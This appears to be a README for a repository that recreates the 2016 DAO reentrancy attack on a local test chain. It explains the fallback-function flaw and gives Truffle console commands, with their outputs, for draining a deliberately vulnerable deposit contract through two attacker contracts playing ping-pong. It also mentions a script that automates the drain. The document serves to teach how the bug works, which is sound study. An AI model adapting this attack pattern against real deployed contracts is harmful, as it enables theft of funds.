#Detailed run through a reentrancy bug attrack

In 2016 I remember watching the DAO contract getting drained of all its Ether. In 2018 I did the Consensus Solidity course. I understand what a re-entrancy bug is, but its always bothered me how exactly did the attacker get away with so much Ether.

My background is in Numerical programming, the first language I learnt was Fortran, then C. My general work flow was to write the numerical code I needed in C, compile it as DLL and then call it from Excel.

Why Excel, its a nice front end and it interfaced seamlessly with Reuters (shoutout to Amal).

C gave me speed, Excel gave me a relatively easy front end to program. Things like OOP, inheritance or function overloading have never been my thing. My programming style has always been to write short simple functions, that I debug by stepping through the code and literally see and watch what its doing.

The concept of Ethereum in 2015 really spoke to me, the idea that you could have these contracts/actors that could receive a message and then run some code and its not a cloud based system, and you are guaranteed that the code will run exactly as written its immutable,so the specified code cannot be changed and the Nakamoto consensus ensures that it is run correctly.

Of course you could just run the code on your own machine, but having a distributed network where you could interact with others, in a trustless way was completely revolutionary. I was and I still am convinced this will completely change the world. Given that I am an optimist, I also think it will result in a better world.

I was not too concerned about the DAO hack, to me it was early days, a fork was the obvious and correct solution. To the hacker I say, dude take long long look at yourself, being so destructive is not good for you.

So after all these years and in the midst of the DEFI craze I finally took the time to try and understand it more fully. In short its not that clever, I know that I am not exploring everything the hacker did, like optimize his(er) gas costs etc. The attacker was alerted to the presence of the bug, then all they had to do was design a way to reset it so that they could repeat the attack.

To my mind informing the Ethereum community, or more flamboyantly draining the entire DAO and yhen returning all the Ether, would have assured them fame and gratitude, the way they went about it, means they are just an anonymous destructive **"JOKER"** personality, its a pity because they clearly have skills. The nature of the DAO was that it had timelocks etc etc, which meant that the possibility of a hard fork was almost certain, so that the monetary advantage would probably be less than the fame and eternal gratitude of the entire community.

What I have done is write some code from the gound up to replicate the basics of re-entracy and the ping pong nature of the hack. To fully understand what occured. The code is not "right" for example all functions are defined as public, I am not using a real token. I am not using safe math. The withdrawl check is a joke. What I was after was the simplist version where I could actually see what was occuring.

Ethereum has a EVM(Ethereum virtual machine) which is basically a stack based machine, this link has an excellent explanation as too what these are https://igor.io/2013/08/28/stack-machines-fundamentals.html

**The rentrancy bug works like this:** 
The EVM is running a function the function has certain values on the stack and certain values in memory, it may also have stored certain values in the state, it then sends a message to another contract/actor the way Ethereum works if the receiving contract does not have a function that has been called, (its a whole complex encoding that goes on it uses the function signature the values being passed to the function and a SHA3/Kekkack hash of all of this to identify the function,function overloading is allowed), in the event that nothing triggers a fallback function is run. This will always run, as of this writing I am unsure if this only runs if Ether is sent, or if any message is sent?

Anyway at this point the function that is executing, transfers control of the stack to the other contract/actor this contract can now run anything that is allowed within the Gas allocated to it, after its finished it returns this new stack to the code in the original contract/actor, if that contract/actor makes the assumption that the called contract/actor did nothing it could be a catotrophic mistake. In the case of the DAO the attacker called the SplitDAO function  this function then sent ether to the attackers contract this caused the fallback function ( now called receive in solidity) to run, the attacker added his malicious code here. this is why to me, **this is a hack!** *The hack did not use the contract as written, he inserted his own code.* 
Simply the code the hacker inserted was too call the splitDAO function again to withdraw his ether again. 

I used to have a numerical analysis lecturer who used to say, to iterate is human to recurse is divine. You can see this is a kind of recursion, the issue with recursion is what will cause it to halt, to those familer with Excel, this is a circular reference. In Excel you can set recursion to true, this will allow circular references. but you also have to speficy a value for how many times it will run before deciding that the cells affected have converged that is are no longer changing, so after this number say 1024 it will just halt, so that it does not lock your machine doing some pointless calculation. In Ethereum from what I have read this limit is 128. If you are asking yourself why does the EVM have this at all. To be useful Ethereum must have this structure where sending a message to a contract will cause it to run some code. so unfortunately this is fundemental to the functioning of the system if you want a non trivial machine/network. 

The attacker withdrew 258 ETH each call, the malicious code seems to have been limited to 31 cycles, so I did the same. So in the following the 258 and the value of 31 are totally arbitary

First things first ganache-cli needs to be installed, secondly Truffle needs to be installed.
Clone the resposity change directory to the respository.

I used VisualCode with the solidity extension.
In a terminal window type

`ganache-cli -d -i 66`

The i is the code that identifies the network.
-d means always generate the same accounts and deploy contracts to the same address's
This is critical as nothing will work in the code unless this flag is used.
In another terminal or in the terminal window in VS type
`truffle console --network development`
This will bring up the truffle console
the file truffle-config.js has all the setting for this netwrok and the compiler being used.
Now type
`migrate reset` 
this will compile and deploy four contracts to the ganache instance
Migrations
Deposit
AttackA
AttackB

truffle has a very good debugger that is awesome at looking at whats actually going on
once a transactiuon is submitted and has been mined by ganache if you copy the transactionHash
and run debug transactionHash in the console it will bring up the debugger
in a terminal window its truffle transactionHash
If it says something about not finding the soutrce code thats because the ganache instance and truffle are out of sync.
the easiest way to resolve it is to quit the debbugger with q
quit truffle with .exit 
ctrl-c for ganache-cli
restart ganache-cli -d -i 66
restart truffle console --network development
migrate reset in truffle console
Should resolve it in most cases.

Debugger commands are as follows
b attack.sol:55 will set a breakpoint at line 55 of attack.sol
B all will remove all breakpoints
Then c will run until the breakpoint is hit
v will show local variables
:<|expression|> will show that <|expression|>
+:<|expression|> will add a watch expression. -:<|expresssion|> will remove it
? will list all watchs and breakpoints
; will show low level opcodes and the stack, I am unsure how to switch it off once it starts
h shows help
q quits it.

Now create an interaface for the contracts
`d = await Deposit.deployed()`
`A = await AttackA.deployed()`
`B = await AttackB.deployed()`

 Now send d some Ether
 `await d.sendTransaction({from:accounts[0],value:web3.utils.toWei('15', 'ether')})`
 The attack withdrew 258 ether each cycle
 
 Now send A 258 wei worth of Tokens
 `A.sendDeposit(258)`
 Check Ether balance of d address
 `await web3.utils.fromWei(await web3.eth.getBalance(d.address))`
 Should give
 '15'
 Check Ether balance of A and B
 `await web3.utils.fromWei(await web3.eth.getBalance(A.address))`
 should give 0
 `await web3.utils.fromWei(await web3.eth.getBalance(B.address))`
 should give 0
 Now call executeAttack
 `A.executeAttack(true)`
 Now withdraw the 258 wei
 `A.withDraw(258)`
 Check balance of d
 `await web3.utils.fromWei(await web3.eth.getBalance(d.address))`
 14.999999999999991486
 Now check balance of A
 `await web3.utils.fromWei(await web3.eth.getBalance(A.address))`
 0.000000000000008514
 Notice it withdrew 8514/258 = 33
 So it withdraws Once because of the initial call, then 31+1 times because the variable mutex in AttackA is set to 31 runs from 0
 So 32+1 = 33
 Now lets check Token balance of the attackA account in the deposit contract
 `(await d.getDepositBalance(A.address)).toString()`
 0
 Its zero, you can read the comment in the deposit.sol code about SAFE MATH
 Now check the token balance in contract B
 `(await d.getDepositBalance(B.address)).toString()`
 258
 So if we try and withdraw from contract A again it will revert because the Balance on deposit contract is zero
 `A.withDraw(258)`
 Generates a lot of stuff on the screen but in there is 
 reason: "Balance is zero"
 At this point the attack should halt, but wait we have a psoitive balance over at Contract B
 If we run 
 `B.executeAttack(true)`
 Then call
 `B.withDraw(258)`
 If we check the Balances again
 `(await d.getDepositBalance(B.address)).toString()`
  0
  So the B contract now has balance of zero on deposit
  While, wait for it... contract A has a balance of 258
  `(await d.getDepositBalance(A.address)).toString()`
  258
  Ether Balance on contract A is as expected unchanged
  `await web3.utils.fromWei(await web3.eth.getBalance(A.address)`
  0.000000000000008514
  While B is
  `await web3.utils.fromWei(await web3.eth.getBalance(B.address)`
  0.000000000000008514
  The deposit contract is now
  `await web3.utils.fromWei(await web3.eth.getBalance(d.address)`
    14.999999999999982972
    It was  14.999999999999991486
 14.999999999999991486 - 14.999999999999982972 = 8514
 Now we can run withdraw on contractA again and then on contractB until we run out of ether for Gas or the Deposit contract runs out of Ether
The attacker did the ping-pong about 50x from my reading.

So in short the splitDAO had a bug the update balance was in the wrong place, it updated after the Ether was sent instaed of updating and then 
sending the Ether. The attacker by using to two contracts used a ping-pong or bkeeping the ballon flying strategy, to keep the attack alive.

Repeating the steps above of course this can automated, it will drain all the Ether out of the deposit contract.

DAO.js contains a script that automates the above actions
To run first start truffle console
`migrate reset`
`d = await Deposit.deployed()`
Send some Ether to the deposit contract
`await d.sendTransaction({from:accounts[0],value:web3.utils.toWei('15', 'ether')})`
Once deposit contract has some Ether in it
`exec ./DAO.js`








 






